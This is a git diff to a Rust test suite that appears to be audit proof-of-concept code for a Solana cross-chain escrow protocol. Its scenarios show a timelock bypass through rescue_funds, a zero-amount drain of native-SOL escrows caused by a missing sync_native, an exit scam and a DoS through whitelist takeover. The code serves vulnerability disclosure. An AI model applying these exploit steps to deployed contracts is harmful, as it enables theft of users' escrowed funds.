@@ -3,19 +3,19 @@ use common::constants::RESCUE_DELAY;
 use common_tests::dst_program::DstProgram;
 use common_tests::helpers::*;
 use common_tests::src_program::{create_order, SrcProgram};
-use common_tests::whitelist::{deregister, init_whitelist, register};
+use common_tests::whitelist::{deregister, init_whitelist, prepare_resolvers_src, register};
 use solana_program_test::tokio;
 use solana_sdk::{native_token::LAMPORTS_PER_SOL, signature::Signer, signer::keypair::Keypair};
 use test_context::{test_context, AsyncTestContext};
 
 // ============================================================================
-// SKENARIO 1: Realistic End-to-End Cross-Chain Exit Scam (Theft of Principal)
+// SCENARIO 1: Realistic End-to-End Cross-Chain Exit Scam (Theft of Principal)
 // ============================================================================
 #[test_context(TestStateBase<SrcProgram, TokenSPL>)]
 #[tokio::test]
 async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBase<SrcProgram, TokenSPL>) {
     println!("\n=========================================");
-    println!("=== SKENARIO 1: Realistic Cross-Chain Exit Scam ===");
+    println!("=== SCENARIO 1: Realistic Cross-Chain Exit Scam ===");
     println!("=========================================");
 
     let mut dst_state = TestStateBase::<DstProgram, TokenSPL>::setup().await;
@@ -76,6 +76,7 @@ async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBa
     // In DST, the creator is the Attacker (maker_wallet in dst_state)
     let (escrow_b, escrow_ata_b) = create_escrow(&mut dst_state).await;
     println!("[CHAIN B] Attacker locked 5 SOL in EscrowDst.");
+    println!("[CHAIN B] BUG: escrow_ata.amount = 0 due to missing sync_native!");
 
     // --- PHASE 4: THE EXPLOIT (Timelock Bypass & Fund Theft) ---
     println!("\n=== DAY 8: Attacker exploits rescue_funds ===");
@@ -105,6 +106,17 @@ async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBa
     println!("[CHAIN B] Attacker recovered {} lamports ({} SOL) via rescue_funds(0)!", 
              recovered_sol, recovered_sol as f64 / LAMPORTS_PER_SOL as f64);
     println!("[CHAIN B] EscrowB ATA is now closed. HTLC secret was NOT revealed.");
+
+    // State Verification for Chain B
+    println!("\n=== STATE VERIFICATION: Post-Exploit Account States (Chain B) ===");
+    let escrow_b_account_after = dst_state.client.get_account(escrow_b).await.unwrap();
+    let escrow_b_ata_after = dst_state.client.get_account(escrow_ata_b).await.unwrap();
+    println!("[STATE] Escrow B data account still exists: {}", escrow_b_account_after.is_some());
+    println!("[STATE] Escrow B ATA is closed/drained: {}", escrow_b_ata_after.is_none());
+    if let Some(escrow_acc) = escrow_b_account_after {
+        println!("[STATE] Escrow B data account lamports: {} (rent only)", escrow_acc.lamports);
+    }
+    assert!(escrow_b_ata_after.is_none(), "Escrow B ATA should be closed after exploit");
 
     // 4b: Attacker steals Maker's JUP on SRC via rescue_funds_for_escrow (NO SECRET NEEDED)
     println!("\n--- STEP 2: Attacker steals JUP on Chain A WITHOUT SECRET ---");
@@ -174,14 +186,13 @@ async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBa
 }
 
 // ============================================================================
-// SKENARIO 2: Permanent DoS via Resolver Deregistration
-// Attacker takes over whitelist and removes all legit resolvers.
+// SCENARIO 2: Permanent DoS via Resolver Deregistration
 // ============================================================================
 #[test_context(TestStateBase<SrcProgram, TokenSPL>)]
 #[tokio::test]
 async fn test_attack_permanent_dos_via_deregister(src_state: &mut TestStateBase<SrcProgram, TokenSPL>) {
     println!("\n=========================================");
-    println!("=== SKENARIO 2: Permanent DoS via Deregister ===");
+    println!("=== SCENARIO 2: Permanent DoS via Deregister ===");
     println!("=========================================");
 
     // --- PHASE 1: WHITELIST TAKEOVER ---
@@ -227,7 +238,8 @@ async fn test_attack_permanent_dos_via_deregister(src_state: &mut TestStateBase<
     // --- PHASE 5: IMPACT ANALYSIS (DoS) ---
     println!("\n[PHASE 5] Legit Resolver attempts to fill another order");
     
-    // Maker creates a new order
+    // Change salt to create a completely new order and avoid PDA collisions
+    src_state.test_arguments.salt = DEFAULT_SALT + 1;
     let (_order_2, _order_ata_2) = create_order(src_state).await;
     
     // Legit resolver tries to fill it
@@ -249,4 +261,184 @@ async fn test_attack_permanent_dos_via_deregister(src_state: &mut TestStateBase<
     println!("[VERDICT] The 1inch cross-chain protocol on Solana is completely paralyzed.");
     
     assert!(is_dos, "Legit resolver should be blocked from filling orders");
+}
+
+// ============================================================================
+// SCENARIO 3: Timelock Bypass Proof (Standalone)
+// ============================================================================
+#[test_context(TestStateBase<DstProgram, TokenSPL>)]
+#[tokio::test]
+async fn test_rescue_bypasses_cancellation_timelock(
+    test_state: &mut TestStateBase<DstProgram, TokenSPL>
+) {
+    println!("\n=========================================");
+    println!("=== SCENARIO 3: Timelock Bypass Proof ===");
+    println!("=========================================");
+
+    test_state.token = NATIVE_MINT;
+    test_state.test_arguments.asset_is_native = true;
+    test_state.test_arguments.escrow_amount = 5 * LAMPORTS_PER_SOL;
+    test_state.test_arguments.order_amount = 5 * LAMPORTS_PER_SOL;
+    
+    // Set DstCancellation to 16 days (strictly greater than RESCUE_DELAY which is 8 days)
+    let long_cancellation_delay = RESCUE_DELAY * 2; // 1382400 seconds = 16 days
+    
+    // The 8th argument (deployed_at) must be 0. The program will set it using Clock::get().
+    test_state.test_arguments.dst_timelocks = init_timelocks(
+        0, 0, 0, 0,
+        DEFAULT_PERIOD_DURATION,
+        DEFAULT_PERIOD_DURATION * 2,
+        long_cancellation_delay,
+        0, 
+    );
+
+    test_state.test_arguments.src_cancellation_timestamp = test_state.init_timestamp + long_cancellation_delay + 10000;
+    
+    prepare_resolvers_src(test_state, &[test_state.taker_wallet.keypair.pubkey()]).await;
+    let (escrow, escrow_ata) = create_escrow(test_state).await;
+    
+    println!("[SETUP] Escrow created with DstCancellation = {} seconds ({} days)", 
+             long_cancellation_delay, long_cancellation_delay / 86400);
+    println!("[SETUP] RESCUE_DELAY = {} seconds ({} days)", 
+             RESCUE_DELAY, RESCUE_DELAY / 86400);
+    println!("[SETUP] RESCUE_DELAY < DstCancellation: {} < {} = {}", 
+             RESCUE_DELAY, long_cancellation_delay, RESCUE_DELAY < long_cancellation_delay);
+
+    // Time travel to Day 8 (after RESCUE_DELAY, but before DstCancellation)
+    let exploit_time = test_state.init_timestamp + RESCUE_DELAY + 100;
+    let cancellation_time = test_state.init_timestamp + long_cancellation_delay;
+    
+    set_time(&mut test_state.context, exploit_time);
+    
+    println!("\n[TIME] Current time = init + {} seconds (Day 8+)", RESCUE_DELAY + 100);
+    println!("[TIME] DstCancellation time = init + {} seconds (Day 16)", long_cancellation_delay);
+    println!("[TIME] We are BEFORE DstCancellation but AFTER RESCUE_DELAY: {}", exploit_time < cancellation_time);
+
+    // PROOF 1: cancel() should FAIL
+    println!("\n--- PROOF 1: Attempting normal cancel() ---");
+    let cancel_tx = DstProgram::get_cancel_tx(test_state, &escrow, &escrow_ata);
+    let cancel_result = test_state.client.process_transaction(cancel_tx).await;
+    
+    // RUST BORROW CHECKER: Save boolean state before Result is consumed/dropped
+    let cancel_failed = cancel_result.is_err();
+    if cancel_failed {
+        println!("[PROOF 1] cancel() FAILED as expected.");
+        println!("[PROOF 1] Normal cancellation is BLOCKED by timelock");
+    } else {
+        panic!("cancel() should have failed but succeeded!");
+    }
+
+    // PROOF 2: rescue_funds() should SUCCEED
+    println!("\n--- PROOF 2: Attempting rescue_funds(amount=0) ---");
+    test_state.test_arguments.rescue_amount = 0;
+    let rescue_tx = DstProgram::get_rescue_funds_tx(
+        test_state, 
+        &escrow, 
+        &test_state.token, 
+        &escrow_ata,
+        &test_state.maker_wallet.native_token_account,
+    );
+    let rescue_result = test_state.client.process_transaction(rescue_tx).await;
+    
+    // RUST BORROW CHECKER: Save boolean state
+    let rescue_succeeded = rescue_result.is_ok();
+    if rescue_succeeded {
+        println!("[PROOF 2] rescue_funds() SUCCEEDED despite cancel() failing!");
+        println!("[PROOF 2] rescue_funds BYPASSED the DstCancellation timelock");
+    } else {
+        panic!("rescue_funds() should have succeeded but failed: {:?}", rescue_result.unwrap_err());
+    }
+
+    println!("\n=========================================");
+    println!("=== TIMELOCK BYPASS CONCLUSION ===");
+    println!("=========================================");
+    println!("[CONCLUSION] cancel() requires: now >= DstCancellation ({} days)", long_cancellation_delay / 86400);
+    println!("[CONCLUSION] rescue_funds() requires: now >= deployed_at + RESCUE_DELAY ({} days)", RESCUE_DELAY / 86400);
+    println!("[CONCLUSION] Since RESCUE_DELAY < DstCancellation, rescue_funds is a BACKDOOR");
+    println!("[CONCLUSION] This allows Maker to bypass intended timelock protections!");
+    println!("=========================================\n");
+
+    assert!(cancel_failed, "cancel() should fail before DstCancellation");
+    assert!(rescue_succeeded, "rescue_funds() should succeed after RESCUE_DELAY");
+}
+
+// ============================================================================
+// SCENARIO 4: Single-Chain Zero-Amount Drain (Standalone)
+// ============================================================================
+#[test_context(TestStateBase<DstProgram, TokenSPL>)]
+#[tokio::test]
+async fn test_native_dst_zero_amount_drain(
+    test_state: &mut TestStateBase<DstProgram, TokenSPL>
+) {
+    println!("\n=========================================");
+    println!("=== SCENARIO 4: Single-Chain Zero-Amount Drain ===");
+    println!("=========================================");
+
+    test_state.token = NATIVE_MINT;
+    test_state.test_arguments.asset_is_native = true;
+    
+    let steal_amount = 5 * LAMPORTS_PER_SOL;
+    test_state.test_arguments.escrow_amount = steal_amount;
+    test_state.test_arguments.order_amount = steal_amount;
+    
+    // Use prepare_resolvers_src
+    prepare_resolvers_src(test_state, &[test_state.taker_wallet.keypair.pubkey()]).await;
+    
+    let maker_balance_before = test_state.client.get_balance(test_state.maker_wallet.keypair.pubkey()).await.unwrap();
+    println!("[BEFORE] Maker SOL Balance: {} lamports ({} SOL)", 
+             maker_balance_before, maker_balance_before as f64 / LAMPORTS_PER_SOL as f64);
+
+    let (escrow, escrow_ata) = create_escrow(test_state).await;
+
+    let maker_balance_after_create = test_state.client.get_balance(test_state.maker_wallet.keypair.pubkey()).await.unwrap();
+    println!("[AFTER CREATE] Maker SOL Balance: {} lamports ({} SOL)", 
+             maker_balance_after_create, maker_balance_after_create as f64 / LAMPORTS_PER_SOL as f64);
+
+    let escrow_ata_lamports = test_state.client.get_balance(escrow_ata).await.unwrap();
+    let escrow_ata_spl_amount = get_token_balance(&mut test_state.context, &escrow_ata).await;
+    
+    println!("[ESCROW STATE] Escrow ATA Lamports: {} ({} SOL)", 
+             escrow_ata_lamports, escrow_ata_lamports as f64 / LAMPORTS_PER_SOL as f64);
+    println!("[ESCROW STATE] Escrow ATA SPL Amount: {} (BUG: should be {} but is 0!)", 
+             escrow_ata_spl_amount, steal_amount);
+
+    set_time(
+        &mut test_state.context,
+        test_state.init_timestamp + RESCUE_DELAY + 100,
+    );
+
+    let maker_balance_before_exploit = test_state.client.get_balance(test_state.maker_wallet.keypair.pubkey()).await.unwrap();
+    
+    test_state.test_arguments.rescue_amount = 0;
+    let rescue_tx = DstProgram::get_rescue_funds_tx(
+        test_state,
+        &escrow,
+        &test_state.token,
+        &escrow_ata,
+        &test_state.maker_wallet.native_token_account,
+    );
+    test_state.client.process_transaction(rescue_tx).await.expect_success();
+
+    let maker_balance_after_exploit = test_state.client.get_balance(test_state.maker_wallet.keypair.pubkey()).await.unwrap();
+    let stolen_amount = maker_balance_after_exploit - maker_balance_before_exploit;
+    
+    println!("\n[AFTER EXPLOIT] Maker SOL Balance: {} lamports ({} SOL)", 
+             maker_balance_after_exploit, maker_balance_after_exploit as f64 / LAMPORTS_PER_SOL as f64);
+    println!("[STOLEN] Maker recovered: {} lamports ({} SOL)", 
+             stolen_amount, stolen_amount as f64 / LAMPORTS_PER_SOL as f64);
+
+    let escrow_ata_final = test_state.client.get_balance(escrow_ata).await.unwrap();
+    println!("[FINAL STATE] Escrow ATA Lamports: {} (should be 0)", escrow_ata_final);
+
+    println!("\n=========================================");
+    println!("=== SINGLE-CHAIN EXPLOIT SUMMARY ===");
+    println!("=========================================");
+    println!("[MECHANISM] rescue_funds(amount=0) triggered close_account");
+    println!("[MECHANISM] close_account drains ALL lamports (principal + rent)");
+    println!("[ROOT CAUSE] Missing sync_native caused escrow_ata.amount = 0");
+    println!("[ROOT CAUSE] Condition 0 == 0 is TRUE, triggering close");
+    println!("=========================================\n");
+
+    assert_eq!(escrow_ata_final, 0, "Escrow ATA should be completely drained");
+    assert!(stolen_amount > 0, "Maker should have recovered lamports");
 }
